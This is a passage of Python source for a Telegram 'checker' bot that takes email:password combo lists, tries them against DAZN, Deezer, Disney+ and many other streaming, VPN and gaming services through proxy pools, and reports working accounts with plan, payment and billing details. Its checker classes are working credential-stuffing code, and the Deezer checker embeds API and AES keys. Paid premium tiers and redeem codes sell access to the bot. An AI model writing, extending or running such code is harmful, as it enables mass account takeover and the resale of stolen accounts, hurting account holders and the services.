            if ("➜ -" in low or "➜ n/a" in low) and "account" not in low and "made by" not in low:
                continue
            filtered.append(ln)
        return "\n".join(filtered)

    # Generic
    plan = clean_val(r.get("plan") or r.get("offer_name") or r.get("premium_type") or r.get("plan_name"))
    streams = clean_val(r.get("streams") or r.get("max_stream") or r.get("device_limit"))
    next_bill = clean_val(r.get("next_billing") or r.get("renewal") or r.get("next_renewal") or r.get("renewal_date"))
    auto_renew = r.get("auto_renew") or r.get("renew") or r.get("autoRenew") or "-"
    if isinstance(auto_renew, bool):
        auto_renew = "Yes" if auto_renew else "No"
    expiry = clean_val(r.get("expires") or r.get("expiration_date") or r.get("expires_at") or r.get("expiry_date"))
    country = format_country(r.get("country") or r.get("cc") or r.get("proxy_country") or "")
    payment = clean_val(r.get("payment") or r.get("payment_method") or r.get("payment_service"))
    plan_base = clean_val(r.get("sku") or r.get("plan_sku") or r.get("plan_base") or r.get("category"))
    user = clean_val(r.get("user") or r.get("user_name") or r.get("username") or r.get("name"))
    verified = r.get("verified") if "verified" in r else r.get("email_verified")
    if verified is True:
        verified = "Yes"
    elif verified is False:
        verified = "No"
    else:
        verified = clean_val(verified)
    days = r.get("days_left") or r.get("days_remaining") or r.get("days") or ""
    days_bit = f" ({days} days)" if str(days) not in ("", "N/A", "None", "-") else ""
    response_line = clean_val(r.get("message") or status.upper())

    lines = [
        title,
        "",
        f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>",
        f"{E('ok1')} <b>Response</b> ➜ {response_line}",
        f"{E('spark')} <b>Plan</b> ➜ {plan}",
        f"{E('bolt')} <b>Max Stream</b> ➜ {streams}",
        f"{E('cal')} <b>Next Billing</b> ➜ {next_bill}",
        f"{E('fire')} <b>Auto Renew</b> ➜ {clean_val(auto_renew)}",
        f"{E('time')} <b>Expiry</b> ➜ {expiry}{days_bit}",
        f"{E('world')} <b>Country</b> ➜ {country}",
        f"{E('card')} <b>Payment</b> ➜ {payment}",
        f"{E('pin')} <b>Plan Base</b> ➜ {plan_base}",
        f"{E('robot')} <b>User</b> ➜ {user}",
        f"{E('tick')} <b>Email Verified</b> ➜ {verified}",
    ]
    extra_keys = ("level", "games", "balance", "steam_id", "tier", "state", "credit", "license", "ovpn_user", "league_pass")
    for k in extra_keys:
        if k in r and r[k] not in (None, "", "N/A", "-"):
            lines.append(f"{E('star')} <b>{k.replace('_', ' ').title()}</b> ➜ {r[k]}")
    lines += ["", f"{E('crown')} <b>Made By</b> ➜ {CONTACT_ADMIN}"]
    filtered = []
    for ln in lines:
        if not ln:
            filtered.append(ln); continue
        low = ln.lower()
        if ("➜ -" in low or "➜ n/a" in low) and "account" not in low and "made by" not in low:
            continue
        filtered.append(ln)
    return "\n".join(filtered)



# Default Media Configuration
DEFAULT_MEDIA = {
    "welcome": {"type": "photo", "path": "media_welcome.jpg"},
    "checkers": {"type": "photo", "path": "media_checkers.jpg"},
    "dazn": {"type": "photo", "path": "media_dazn.jpg"},
    "deezer": {"type": "photo", "path": "media_deezer.jpg"},
    "disney": {"type": "photo", "path": "media_disney.jpg"},
    "hotspotshield": {"type": "photo", "path": "media_hotspotshield.jpg"},
    "nordvpn": {"type": "photo", "path": "media_nordvpn.jpg"},
    "steam": {"type": "photo", "path": "media_steam.jpg"},
    "expressvpn": {"type": "photo", "path": "media_expressvpn.jpg"},
    "crunchyroll": {"type": "photo", "path": "media_crunchyroll.jpg"},
    "xbox": {"type": "photo", "path": "media_xbox.jpg"},
    "hotmail": {"type": "photo", "path": "media_hotmail.jpg"},
    "nba": {"type": "photo", "path": "media_nba.jpg"},
    "paramount": {"type": "photo", "path": "media_paramount.jpg"},
    "netflix": {"type": "photo", "path": "media_netflix.jpg"},
    "pluto": {"type": "photo", "path": "media_pluto.jpg"},
    "plex": {"type": "photo", "path": "media_plex.jpg"},
    "peacock": {"type": "photo", "path": "media_peacock.jpg"},
    "makemusic": {"type": "photo", "path": "media_makemusic.jpg"},
    "tabii": {"type": "photo", "path": "media_tabii.jpg"},
    "playabl": {"type": "photo", "path": "media_playabl.jpg"},
    "multichecker": {"type": "photo", "path": "media_multichecker.jpg"},
    "stats": {"type": "photo", "path": "media_stats.jpg"},
    "redeem": {"type": "photo", "path": "media_redeem.jpg"},
    "admin_panel": {"type": "photo", "path": "media_admin.jpg"},
    "cooldown": {"type": "sticker", "file_id": ""},
    "hit": {"type": "sticker", "file_id": ""},
    "force_join": {"type": "photo", "path": "media_force_join.jpg"},
    "viki": {"type": "photo", "path": "media_viki.jpg"},
}

# Welcome Text with Premium Emojis Everywhere
WELCOME_TEXT = (
    e_line("<b>DAZN &amp; DEEZER &amp; MULTI CHKR</b>", "diamond", "spark", 0)
    + "\n\n\n"
    + e_line("Welcome to the premium checker bot.", "crown", "fireheart", 1)
    + "\n\n\n"
    + e_line("Check DAZN, Deezer, Steam, Xbox, Plex, Pluto, Peacock, NBA and more.", "rocket", "glow", 2)
    + "\n\n\n"
    + e_line("<b>Premium Access</b> — unlimited checks &amp; no cooldown.", "gem", "fire", 3)
    + "\n\n\n"
    + e_line("Have a redeem code? Use the Redeem button below.", "gift1", "star", 4)
    + "\n"
)

# ==================== DATABASE# ==================== DATABASE HELPERS ====================
def load_json(filename, default):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f: return json.load(f)
        except: return default
    return default

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=2)

def load_users(): return load_json(USERS_DB, {})
def save_users(data): save_json(USERS_DB, data)
def load_redeem_codes(): return load_json(REDEEM_CODES_DB, {})
def save_redeem_codes(data): save_json(REDEEM_CODES_DB, data)

def load_bot_settings():
    default = {
        "welcome_text": WELCOME_TEXT,
        "media": DEFAULT_MEDIA.copy(),
        "force_join_channels": [],
        "custom_checkers": []
    }
    settings = load_json(BOT_SETTINGS_DB, default)
    if not isinstance(settings, dict):
        settings = default
    # never wipe saved media — only fill missing keys from defaults
    if "media" not in settings or not isinstance(settings.get("media"), dict):
        settings["media"] = DEFAULT_MEDIA.copy()
    else:
        for k, v in DEFAULT_MEDIA.items():
            if k not in settings["media"]:
                settings["media"][k] = v
    if "force_join_channels" not in settings:
        settings["force_join_channels"] = []
    if "custom_checkers" not in settings:
        settings["custom_checkers"] = []
    if "welcome_text" not in settings or not settings.get("welcome_text"):
        settings["welcome_text"] = WELCOME_TEXT
    return settings

def save_bot_settings(data): save_json(BOT_SETTINGS_DB, data)

def load_admins():
    admins = load_json(ADMINS_DB, {})
    if not admins:
        admins = {str(MAIN_ADMIN_ID): True}
        save_json(ADMINS_DB, admins)
    return admins

def save_admins(data): save_json(ADMINS_DB, data)

# ==================== PERMANENT USER PROXIES ====================
def get_user_proxies(user_id):
    u = get_user(user_id) or {}
    px = u.get("proxies") or []
    if not isinstance(px, list):
        px = []
    return [str(p).strip() for p in px if str(p).strip()]


def save_user_proxies(user_id, proxies):
    users = load_users()
    key = str(user_id)
    if key not in users:
        users[key] = get_user(user_id) or {}
    # unique keep order
    seen = set()
    clean = []
    for p in proxies or []:
        p = str(p).strip()
        if p and p not in seen:
            seen.add(p)
            clean.append(p)
    users[key]["proxies"] = clean
    save_users(users)
    return clean


def add_user_proxies(user_id, new_list):
    cur = get_user_proxies(user_id)
    return save_user_proxies(user_id, cur + list(new_list or []))


def clear_user_proxies(user_id):
    return save_user_proxies(user_id, [])


def parse_proxy_lines(text):
    proxies = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("http://") or line.startswith("https://") or line.startswith("socks"):
            proxies.append(line)
            continue
        parts = line.split(":")
        if len(parts) == 4:
            proxies.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
        elif len(parts) == 2:
            proxies.append(f"http://{parts[0]}:{parts[1]}")
        else:
            proxies.append(f"http://{line}")
    return proxies




def test_single_proxy(proxy, timeout=6):
    """Return True if proxy responds."""
    try:
        p = proxy if str(proxy).startswith(("http://", "https://", "socks")) else "http://" + str(proxy)
        proxies = {"http": p, "https": p}
        try:
            r = curl_requests.get("https://api.ipify.org", proxies=proxies, timeout=timeout, impersonate="chrome124")
        except TypeError:
            try:
                r = curl_requests.get("https://api.ipify.org", proxies=proxies, timeout=timeout)
            except Exception:
                r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=timeout)
        return r.status_code == 200
    except Exception:
        try:
            p = proxy if str(proxy).startswith(("http://", "https://", "socks")) else "http://" + str(proxy)
            r = requests.get("https://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=timeout)
            return r.status_code == 200
        except Exception:
            return False


def test_proxies_live(proxy_list, max_workers=40):
    """Return (live_list, dead_list)."""
    live, dead = [], []
    proxies = list(proxy_list or [])
    if not proxies:
        return [], []
    workers = max(1, min(int(max_workers), len(proxies), 60))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(test_single_proxy, p): p for p in proxies}
        for fut in futs:
            p = futs[fut]
            try:
                ok = fut.result()
            except Exception:
                ok = False
            if ok:
                live.append(p)
            else:
                dead.append(p)
    return live, dead



def is_admin(user_id):
    try:
        if int(user_id) == int(MAIN_ADMIN_ID):
            return True
    except Exception:
        pass
    try:
        return str(user_id) in load_admins()
    except Exception:
        return False


def get_user(user_id):
    users = load_users()
    return users.get(str(user_id))

def create_user(user_id, username=None):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "user_id": user_id, "username": username, "is_premium": False,
            "premium_expiry": None, "last_check": None, "total_checks": 0
        }
        save_users(users)
    return users[uid]

def is_premium(user_id):
    if user_id == MAIN_ADMIN_ID: return True
    user = get_user(user_id)
    if not user or not user.get("is_premium"): return False
    if user.get("premium_expiry"):
        if datetime.now() > datetime.fromisoformat(user["premium_expiry"]):
            user["is_premium"] = False
            user["premium_expiry"] = None
            save_users({str(user_id): user})
            return False
    return True

def get_user_limits(user_id):
    if is_premium(user_id):
        return {"max_threads": 35, "line_limit": None, "cooldown_minutes": 0, "has_cooldown": False}
    return {"max_threads": 10, "line_limit": 500, "cooldown_minutes": 10, "has_cooldown": True}


def can_check(user_id):
    if is_premium(user_id): return True, 0
    user = get_user(user_id)
    if not user or not user.get("last_check"): return True, 0
    last_check = datetime.fromisoformat(user["last_check"])
    cooldown_end = last_check + timedelta(minutes=10)
    if datetime.now() >= cooldown_end: return True, 0
    remaining = (cooldown_end - datetime.now()).seconds // 60
    return False, remaining

def update_last_check(user_id):
    users = load_users()
    uid = str(user_id)
    if uid in users:
        users[uid]["last_check"] = datetime.now().isoformat()
        users[uid]["total_checks"] += 1
        save_users(users)

# ==================== DYNAMIC CHECKER LOADER ====================
def load_custom_checker_module(file_path, module_name):
    try:
        spec = importlib.util.spec_from_file_location(module_name, file_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        for attr_name in dir(module):
            attr = getattr(module, attr_name)
            if inspect.isclass(attr):
                for method_name in ['check', 'check_account', 'run', 'execute', 'validate']:
                    if hasattr(attr, method_name):
                        method = getattr(attr, method_name)
                        if callable(method) and not method_name.startswith('_'):
                            return (attr, method_name)
                for method_name in dir(attr):
                    if method_name.startswith('_'): continue
                    method = getattr(attr, method_name)
                    if callable(method):
                        try:
                            sig = inspect.signature(method)
                            params = list(sig.parameters.keys())
                            if 'email' in params or 'combo' in params or len(params) >= 2:
                                return (attr, method_name)
                        except:
                            pass
        for attr_name in dir(module):
            attr = getattr(module, attr_name)
            if inspect.isclass(attr):
                methods = [m for m in dir(attr) if not m.startswith('_') and callable(getattr(attr, m))]
                if methods:
                    return (attr, methods[0])
        return None
    except Exception as e:
        logger.error(f"Failed to load checker {module_name}: {e}")
        return None

# ==================== MEDIA & UTILS ====================
def _safe_caption(caption):
    """Keep Telegram Premium custom emoji (<tg-emoji>); only light cleanup."""
    if not caption:
        return ""
    c = str(caption)
    # Normalize tg-emoji to Telegram HTML form (must keep emoji-id + fallback glyph)
    # Already correct format in EMOJIS map — leave intact.
    # Remove null bytes / control chars that break entities
    c = c.replace("\x00", "").replace("\r", "")
    return c

def send_media_with_caption(user_id, media_key, caption, reply_markup=None, parse_mode='HTML'):
    caption = _safe_caption(caption)
    plain_caption = re.sub(r'<[^>]+>', '', caption or '') or " "

    def _send_text_only():
        try:
            bot.send_message(user_id, caption, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            bot.send_message(user_id, plain_caption, reply_markup=reply_markup, parse_mode=None)

    def _send_video(source):
        # Always attach caption + buttons on the video itself
        try:
            bot.send_video(user_id, source, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)
            return True
        except Exception as e1:
            logger.error(f"video+HTML fail: {e1}")
            try:
                bot.send_video(user_id, source, caption=plain_caption, reply_markup=reply_markup, parse_mode=None)
                return True
            except Exception as e2:
                logger.error(f"video+plain fail: {e2}")
                try:
                    bot.send_video(user_id, source)
                    _send_text_only()
                    return True
                except Exception as e3:
                    logger.error(f"video bare fail: {e3}")
                    return False

    def _send_animation(source):
        try:
            bot.send_animation(user_id, source, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)
            return True
        except Exception as e1:
            logger.error(f"gif+HTML fail: {e1}")
            try:
                bot.send_animation(user_id, source, caption=plain_caption, reply_markup=reply_markup, parse_mode=None)
                return True
            except Exception as e2:
                logger.error(f"gif+plain fail: {e2}")
                try:
                    bot.send_animation(user_id, source)
                    _send_text_only()
                    return True
                except Exception as e3:
                    logger.error(f"gif bare fail: {e3}")
                    return False

    def _send_photo(source):
        try:
            bot.send_photo(user_id, source, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)
            return True
        except Exception as e1:
            logger.error(f"photo+HTML fail: {e1}")
            try:
                bot.send_photo(user_id, source, caption=plain_caption, reply_markup=reply_markup, parse_mode=None)
                return True
            except Exception as e2:
                logger.error(f"photo+plain fail: {e2}")
                try:
                    bot.send_photo(user_id, source)
                    _send_text_only()
                    return True
                except Exception as e3:
                    logger.error(f"photo bare fail: {e3}")
                    return False

    try:
        settings = load_bot_settings()
        media_config = settings.get("media", DEFAULT_MEDIA).get(media_key) or DEFAULT_MEDIA.get(media_key) or {}
        if not isinstance(media_config, dict):
            media_config = {}
        media_type = (media_config.get("type") or "photo").lower()
        file_id = media_config.get("file_id") or ""
        file_path = media_config.get("path") or ""

        # sticker: no caption support on sticker — sticker then text+buttons
        if media_type == "sticker" and file_id:
            try:
                bot.send_sticker(user_id, file_id)
            except Exception as e:
                logger.error(f"sticker send fail: {e}")
            _send_text_only()
            return

        if media_type == "video":
            if file_id:
                if _send_video(file_id):
                    return
            if file_path and os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                with open(file_path, "rb") as vf:
                    if _send_video(vf):
                        return
            _send_text_only()
            return

        if media_type in ("gif", "animation"):
            if file_id:
                if _send_animation(file_id):
                    return
            if file_path and os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                with open(file_path, "rb") as gf:
                    if _send_animation(gf):
                        return
            _send_text_only()
            return

        # photo default
        if file_id:
            if _send_photo(file_id):
                return
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, "rb") as pf:
                if _send_photo(pf):
                    return
        _send_text_only()
    except Exception as e:
        logger.error(f"Error sending media {media_key}: {e}")
        try:
            bot.send_message(user_id, plain_caption, reply_markup=reply_markup, parse_mode=None)
        except Exception:
            pass

def parse_duration_to_days(val):
    val = str(val).lower().strip()
    if val.endswith('m'): return int(val[:-1]) * 30
    elif val.endswith('y'): return int(val[:-1]) * 365
    elif val.endswith('d'): return int(val[:-1])
    else: return int(val)

# ==================== FORCE JOIN LOGIC ====================
def check_all_force_joins(user_id):
    try:
        if is_admin(user_id):
            return []
    except Exception:
        pass
    settings = load_bot_settings()
    channels = settings.get("force_join_channels", [])
    unjoined = []
    for ch in channels:
        try:
            member = bot.get_chat_member(ch["id"], user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                unjoined.append(ch)
        except Exception as e:
            logger.error(f"Error checking channel {ch.get('id')}: {e}")
            unjoined.append(ch)
    return unjoined

# ============================================================
#  BUILT-IN CHECKERS (all with retry logic) – full implementations
# ============================================================

# ----- 1. DeezerChecker -----
class DeezerChecker:
    def __init__(self, proxy=None, timeout=15):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except (httpx.ConnectError, httpx.TimeoutException, httpx.NetworkError, ConnectionResetError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password, proxy):
        session = httpx.Client(timeout=self.timeout, headers={"User-Agent": "Deezer/8.0.50.5 (Android; 12; Mobile; us)"})
        if proxy: session.proxies = {"http://": proxy, "https://": proxy}
        try:
            r1 = session.get("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "output": "3", "version": "8.0.50.5", "method": "mobile_auth"})
            token_hex = r1.json()["results"]["TOKEN"]
            encrypted = binascii.unhexlify(token_hex)
            cipher = AES.new(bytes([0x56, 0x42, 0x4B, 0x31, 0x46, 0x53, 0x55, 0x45, 0x58, 0x48, 0x54, 0x53, 0x44, 0x42, 0x4A, 0x4A]), AES.MODE_ECB)
            decrypted = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
            token_string, token_key, user_info_key = decrypted[:64], decrypted[64:80].encode(), decrypted[80:96].encode()
            auth_token = binascii.hexlify(AES.new(token_key, AES.MODE_ECB).encrypt(token_string.encode())).decode()
            r2 = session.get("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "output": "3", "method": "api_checkToken", "auth_token": auth_token})
            sid = r2.json()["results"]
            r3 = session.post("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "sid": sid, "method": "user_checkRegisterConstraints", "output": "3", "input": "3"}, content=json.dumps({"EMAIL": email}), headers={"Content-Type": "application/json"})
            if r3.status_code != 200: return {"status": "error", "message": f"HTTP {r3.status_code}"}
            reg_data = r3.json()
            results = reg_data.get("results", {})
            errors = results.get("errors", {})
            email_already_used = (results.get("email_already_used") or errors.get("email", {}).get("error") == "email_already_used" or "email_already_used" in str(errors))
            if not email_already_used: return {"status": "bad", "message": "Not registered"}
            pwd_hex = (binascii.hexlify(password.encode()).decode().lower() + "0" * 32)[:32]
            enc_pass = binascii.hexlify(AES.new(user_info_key, AES.MODE_ECB).encrypt(binascii.unhexlify(pwd_hex))).decode()
            r4 = session.post("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "method": "mobile_userAuth", "input": "3", "output": "3", "sid": sid}, content=json.dumps({"mail": email, "password": enc_pass}), headers={"Content-Type": "application/json"})
            login_result = r4.json()
            if "error" in login_result and isinstance(login_result["error"], dict) and login_result["error"]:
                err = login_result["error"]
                if "bad-credentials" in str(err).lower(): return {"status": "bad", "message": "Invalid credentials"}
                return {"status": "error", "message": str(err)}
            user = login_result.get("results", {})
            if not user: return {"status": "error", "message": "Empty results"}
            premium = user.get("PREMIUM", {})
            status = "premium" if premium.get("STATUS", 0) == 1 else "free"
            exp_date = premium.get("DATE_END", "")[:10] if premium.get("DATE_END") else "N/A"
            return {"status": status, "offer_name": premium.get("OFFER_NAME", "Deezer Free"), "expiration_date": exp_date, "country": user.get("COUNTRY", ""), "user_name": user.get("BLOG_NAME", user.get("USER_NAME", ""))}
        except Exception as e:
            return {"status": "error", "message": str(e)[:80]}
        finally:
            session.close()

# ----- 2. DAZNChecker -----
class DAZNChecker:
    def __init__(self, proxy=None, timeout=15):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email, password, proxy=None) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password, proxy):
        session = curl_requests.Session()
        session.impersonate = "chrome110"
        if proxy: session.proxies = {"http": proxy, "https": proxy}
        device_id = str(uuid.uuid4())
        session_id = str(uuid.uuid4())
        bearer_token = None

        payload = {"DeviceId": device_id, "Email": email, "Password": password, "Platform": "android"}
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Host": "authentication-prod.ar.indazn.com", "Origin": "https://tv.dazn.com", "Referer": "https://tv.dazn.com/", "User-Agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36", "x-brand": "dazn", "x-dazn-device": device_id, "X-Requested-With": "com.dazn"}
        resp = session.post("https://authentication-prod.ar.indazn.com/v5/SignIn", json=payload, headers=headers, timeout=self.timeout)
        src = resp.text
        if any(x in src for x in ["InvalidPassword", "InvalidEmailFormat", "AccountBlocked"]): return {"status": "BAD", "error": "Invalid credentials/blocked"}
        if "AuthToken" not in src and "Token" not in src: return {"status": "BAD", "error": "No token"}
        token_key = '"Token":"' if '"Token":"' in src else '"AuthToken":"'
        bearer_token = src.split(token_key)[1].split('"')[0]
        if not bearer_token: return {"status": "BAD", "error": "No token"}

        headers = {"Authorization": f"Bearer {bearer_token}", "Origin": "https://www.dazn.com", "Referer": "https://www.dazn.com/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", "x-brand": "dazn", "x-daznid": device_id, "x-session-id": session_id}
        resp = session.get("https://myaccount-bff.ar.indazn.com/v1/subscriptions", headers=headers, timeout=self.timeout)
        if resp.status_code == 404: return {"status": "FREE", "plan": "No Subscription"}
        data = resp.json()
        subs = data.get("Subscriptions", [])
        if not subs and isinstance(data, list): subs = data
        if not subs: return {"status": "FREE", "plan": "No Subscription"}
        sub = subs[0]
        return {"status": "HIT", "plan": sub.get("PlanName", "Premium"), "expiry_date": sub.get("EndDate", ""), "country": sub.get("Country", ""), "renewal": sub.get("NextBillingDate", "")}

# ----- 3. Disney+ Checker -----
class DisneyChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.req_timeout = 15
        self.sdk_key = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
        self.base_url = "https://disney.api.edge.bamgrid.com"
        self.device_reg_endpoint = f"{self.base_url}/graph/v1/device/graphql"
        self.graphql_endpoint = f"{self.base_url}/v1/public/graphql"
        self.subs_endpoint = f"{self.base_url}/v2/subscribers"
        self.x_app_version = "c4b66d76"
        self.x_sdk_client = "disney-svod-3d9324fc"
        self.x_sdk_platform = "javascript/android/chrome"
        self.x_sdk_version = "c4b66d76-disneyplus-nsx"
        self.x_identity_client = "DTCI-DISNEYPLUS.WEB"
        self.base_headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.disneyplus.com",
            "Referer": "https://www.disneyplus.com/",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "X-Application-Version": self.x_app_version,
            "X-Bamsdk-Client-Id": self.x_sdk_client,
            "X-Bamsdk-Platform": self.x_sdk_platform,
            "X-Bamsdk-Platform-Id": "browser",
            "X-Bamsdk-Version": self.x_sdk_version,
            "X-Bamtech-Wpnx-Mlp-Identifier": "/",
            "X-Bamtech-Wpnx-Mlp-Locale": "en-us",
            "X-Disney-Identity-Client-Id": self.x_identity_client,
        }
        self.register_query = """
        mutation registerDevice($input: RegisterDeviceInput!) {
          registerDevice(registerDevice: $input) {
            grant { grantType assertion }
          }
        }
        """
        self.check_email_query = """
        query check($email: String!, $validateEmailOnOperations: ValidateEmailOnOperationsInput) {
          check(email: $email, validateEmailOnOperations: $validateEmailOnOperations) {
            operations
            nextOperation
            email { isValid validationFailureCodes suggestions { domain } }
          }
        }
        """
        self.login_mutation = """
        mutation login($input: LoginInput!) {
          login(login: $input) {
            actionGrant
            account { activeProfile { id } profiles { id attributes { isDefault parentalControls { isPinProtected } } } }
            activeSession { isSubscriber }
            identity { personalInfo { dateOfBirth gender } flows { personalInfo { requiresCollection eligibleForCollection } } }
          }
        }
        """
        self.me_query = """
        query me {
          me {
            account {
              activeProfile { id name }
              profiles { id name }
              attributes { email emailVerified locations { registration { geoIp { country } } purchase { country } } }
            }
            identity {
              email
              subscriber {
                subscriberStatus
                subscriptions {
                  id
                  state
                  partner
                  source { sourceProvider sourceType subType }
                  product { name subscriptionPeriod earlyAccess trial { duration } categoryCodes }
                  term { expiryDate nextRenewalDate isFreeTrial }
                }
              }
            }
          }
        }
        """

    def _safe_json(self, resp):
        try:
            return resp.json()
        except:
            return None

    def _build_headers(self, auth_token=None, request_id=None):
        headers = self.base_headers.copy()
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        if request_id:
            headers["X-Request-ID"] = request_id
            headers["X-BAMSDK-Transaction-ID"] = request_id
        return headers

    def _spawn_device(self, session):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "registerDevice",
            "query": self.register_query,
            "variables": {
                "input": {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "browser",
                    "deviceLanguage": "en",
                    "devicePlatformId": "browser",
                    "attributes": {
                        "brand": "web",
                        "browserName": "chrome",
                        "browserVersion": "139.0.0.0",
                        "manufacturer": "n/a",
                        "model": None,
                        "operatingSystem": "android",
                        "operatingSystemVersion": "10.0",
                        "osDeviceIds": []
                    }
                }
            }
        }
        try:
            response = session.post(
                self.device_reg_endpoint,
                headers=self._build_headers(auth_token=self.sdk_key, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return None
        if response.status_code != 200:
            return None
        data = self._safe_json(response)
        try:
            return data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
        except:
            return None

    def _verify_email(self, session, device_token, email):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "check",
            "query": self.check_email_query,
            "variables": {
                "email": email,
                "validateEmailOnOperations": {"operations": ["Register"]}
            }
        }
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return False
        if response.status_code != 200:
            return False
        data = self._safe_json(response)
        if not data:
            return False
        if data.get("errors"):
            return False
        operations = data.get("data", {}).get("check", {}).get("operations", [])
        return bool(operations) and operations != ["Register"]

    def _login(self, session, device_token, email, password):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "login",
            "query": self.login_mutation,
            "variables": {
                "input": {"email": email, "password": password}
            }
        }
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return None, False, "", "network_error"
        if response.status_code != 200:
            return None, False, "", f"http_{response.status_code}"
        data = self._safe_json(response)
        if not data:
            return None, False, "", "invalid_json"
        errors = data.get("errors")
        if errors:
            code = errors[0].get("extensions", {}).get("code", "unknown_error")
            return None, False, "", code
        try:
            user_token = data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
            is_subscriber = data.get("data", {}).get("login", {}).get("activeSession", {}).get("isSubscriber", False)
            country = data.get("extensions", {}).get("sdk", {}).get("session", {}).get("location", {}).get("countryCode", "")
        except:
            return None, False, "", "extraction_error"
        return user_token, is_subscriber, country, None

    def _fetch_account_details(self, session, user_token):
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=user_token, request_id=str(uuid.uuid4())),
                json={"query": self.me_query},
                timeout=self.req_timeout
            )
            if response.status_code != 200:
                return {}
            data = self._safe_json(response)
            return data.get("data", {}).get("me", {}) if data else {}
        except:
            return {}

    def _get_sub_details(self, session, user_token):
        request_id = str(uuid.uuid4())
        try:
            response = session.get(
                self.subs_endpoint,
                headers=self._build_headers(auth_token=user_token, request_id=request_id),
                timeout=self.req_timeout
            )
        except:
            return {"is_active": False, "error": "Network error"}
        if response.status_code != 200:
            return {"is_active": False, "error": f"HTTP {response.status_code}"}
        data = self._safe_json(response)
        if not isinstance(data, list) or len(data) == 0:
            return {"is_active": False, "plan": "None"}
        sub = data[0]
        return {
            "is_active": sub.get("subscriberStatus") == "ACTIVE",
            "plan": sub.get("product", {}).get("name", "Unknown"),
            "period": sub.get("product", {}).get("subscriptionPeriod", "N/A"),
            "is_free_trial": sub.get("term", {}).get("isFreeTrial", False),
            "next_renewal": sub.get("term", {}).get("nextRenewalDate", "")[:10]
        }

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
